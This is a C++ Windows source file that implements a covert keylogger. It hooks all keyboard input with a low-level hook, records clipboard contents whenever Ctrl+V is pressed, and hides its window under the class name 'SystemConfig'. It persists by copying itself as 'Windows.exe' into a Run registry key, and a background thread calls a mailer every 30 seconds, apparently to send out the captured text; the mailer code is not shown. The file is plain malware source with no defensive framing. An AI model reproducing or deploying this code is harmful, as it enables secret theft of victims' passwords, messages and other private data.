#include <Windows.h>
#include "EventHandling.h"
#include <time.h>
#include <shlwapi.h>
#include <stdio.h>
#include <locale>
#pragma comment (lib, "gdiplus.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "wininet.lib")
WindowsEventHandling* e_handler;
DWORD shift = 0; DWORD alt = 0; DWORD ctrl = 0;
DWORD WINAPI sentarium(PVOID pv) {
	while (1) {
		Sleep(1000 * 30 * 1); e_handler->mailer(); }
}
char key_to_char(char key){
	if (ctrl == 1 && key == 'V')
		return -2;
	if (key == 142) {
		return 'Ä';
	}
	if (key >= 'A' && key <= 'Z')
	{
		if (alt == 0 && shift == 0)
		{
			return key - (int)('A' - 'a');//tolower
		}
		if (shift == 1 && alt == 0)
		{
			return key;//no change
		}
		if (shift == 0 && alt == 1)
		{
			key -= (int)('A' - 'a');
			if (key == 'e')return '€';
			if (key == 'n')return 'µ';
			if (key == '<') return '|';
			return key;
		}
	}
	if (key >= '0' && key <= '9')
	{
		if (shift == 1)
		{
			if (key == '0')return ')';
			if (key == '1')return '!';
			if (key == '2')return '@';
			if (key == '3')return '#';
			if (key == '4')return '¤';
			if (key == '5')return '%';
			if (key == '6')return '^';
			if (key == '7')return '&';
			if (key == '8')return '*';
			if (key == '9')return '(';
		}
		if (alt == 1)
		{
			if (key == '0')return '}';
			if (key == '2')return '@';
			if (key == '3')return '£';
			if (key == '4')return '$';
			if (key == '5')return '€';
			if (key == '7')return '{';
			if (key == '8')return '[';
			if (key == '9')return '}';
		}
		else
		{
			return key;
		}
	}

	if ((char)key == (char)189)
	{
		if (shift == 1)return '_';
		return '-';
	}

	if ((char)key == (char)187)
	{
		if (shift == 1)return '+';
		return '=';
	}

	if ((char)key == (char)VK_SPACE)
		return ' ';
	if ((char)key == (char)VK_RETURN)
		return '\n';
	if ((char)key == (char)VK_TAB)
		return '\t';

	if ((char)key == (char)VK_OEM_1)
	{
		if (shift == 1)
		{
			return ':';
		}
		return ';';
	}

	if ((char)key == (char)VK_OEM_2)
	{
		if (shift == 1)
		{
			return '?';
		}
		return '/';
	}

	if ((char)key == (char)VK_OEM_3)
	{
		if (shift == 1)
		{
			return '~';
		}
		return '`';
	}
	
	if ((char)key == (char)VK_OEM_4)
	{
		if (shift == 1)
		{
			return '{';
		}
		return '[';
	}

	if ((char)key == (char)VK_OEM_5)
	{
		if (shift == 1)
		{
			return '|';
		}
		return '\\';
	}
	if ((char)key == (char)VK_OEM_6)
	{
		if (shift == 1)
		{
			return '}';
		}
		return ']';
	}
	if ((char)key == (char)VK_OEM_7)
	{
		if (shift == 1)
		{
			return '\"';
		}
		return '\'';
	}


	if ((char)key == (char)VK_OEM_COMMA)
	{
		if (shift == 1)return '<';
		return ',';
	}

	if ((char)key == (char)VK_OEM_PERIOD) {
		if (shift == 1)return '>';
		return '.';
	}

	if ((char)key >= (char)VK_NUMPAD0 && (char)key <= (char)VK_NUMPAD9)
		return key - 48;

	if (key == VK_BACK)
		return -1;
	return 0;
}

void act_function_key()
{
	((GetKeyState(VK_RCONTROL) & 0x8000) == 0 && (GetKeyState(VK_LCONTROL) & 0x8000)) == 0 ? ctrl = 0 : ctrl = 1;
	((GetKeyState(VK_RSHIFT) & 0x8000) == 0 && (GetKeyState(VK_LSHIFT) & 0x8000)) == 0 ? shift = 0 : shift = 1;
	((GetKeyState(VK_RMENU) & 0x8000) == 0 && (GetKeyState(VK_LMENU) & 0x8000)) == 0 ? alt = 0 : alt = 1;
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode == HC_ACTION)
	{
		if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP)
		{
			PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;

			act_function_key();
			DWORD k = key_to_char(p->vkCode);
			if (k != 0 && k != -1 && k != -2)
				e_handler->extend(k);
			if (k == -1)
				e_handler->exstend("[<-rc]");
			if (k == -2)
			{
				OpenClipboard(0);
				if (IsClipboardFormatAvailable(CF_TEXT) == (BOOL)true)
				{
					e_handler->exstend("\n[Clipboard]\n");
					e_handler->exstend((char*)GetClipboardData(CF_TEXT));
					e_handler->exstend("\n[/Clipboard]\n");
				}
				CloseClipboard();
			}
		}
	}
	else
	{

	}
		return CallNextHookEx(NULL, nCode, wParam, lParam);
	return 0;
}

HHOOK k_hook;
void homeseeker();
LRESULT CALLBACK DlgProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
	switch (msg){
	case WM_CREATE:{
		k_hook = SetWindowsHookExA(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(0), 0);
		std::string f_path = e_handler->gpth();
		std::string f_name = f_path;
		f_name += "Windows.exe";
		char my_name[260];
		GetModuleFileName(GetModuleHandle(0), my_name, 260);
		std::string f_my = my_name;
		if (f_my != f_name){
			CreateDirectory(f_path.c_str(), NULL);
			CopyFile(f_my.c_str(), f_name.c_str(), FALSE);
		}
		HKEY key;
		RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", NULL, KEY_ALL_ACCESS, &key);
		RegSetValueEx(key, "Windows", 0, REG_SZ, (LPBYTE)f_name.c_str(), f_name.length() + 1);
		CreateThread(0, 0, sentarium, (PVOID)0, 0, 0);
	}
	break;
	case WM_QUIT:
		homeseeker();
		break;
	default:
		return DefWindowProc(hwnd, msg, wParam, lParam);
	}
	return 0;
}

int cw()
{
	LPSTR ClassName = (LPSTR)"SystemConfig";

	WNDCLASSEX wc;

	wc.cbSize = sizeof(WNDCLASSEX);
	wc.style = 0;
	wc.lpfnWndProc = DlgProc;
	wc.cbClsExtra = 0;
	wc.cbWndExtra = 0;
	wc.hInstance = GetModuleHandle(0);
	wc.hIcon = 0;
	wc.hCursor = LoadCursor(NULL, IDC_ARROW);
	wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
	wc.lpszMenuName = NULL;
	wc.lpszClassName = ClassName;
	wc.hIconSm = 0;

	RegisterClassEx(&wc);

	HWND hwnd = CreateWindowEx(WS_EX_CLIENTEDGE, ClassName, "", WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 5, 5, NULL, NULL, GetModuleHandle(0), NULL);
	ShowWindow(hwnd, SW_HIDE);


	MSG com;
	while (GetMessage(&com, NULL, 0, 0))
	{
		TranslateMessage(&com);
		DispatchMessage(&com);
	}

	return com.wParam;
}

void homeseeker() {
	int c = std::remove("C:\\ProgramData\\wininit\\VK_[1;4;2018]-[18,34,46].txt");
	MessageBox(NULL, std::to_string(c).c_str(), "", NULL);
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow)
{
	e_handler = new WindowsEventHandling();
	cw();
	
	return 0;
}
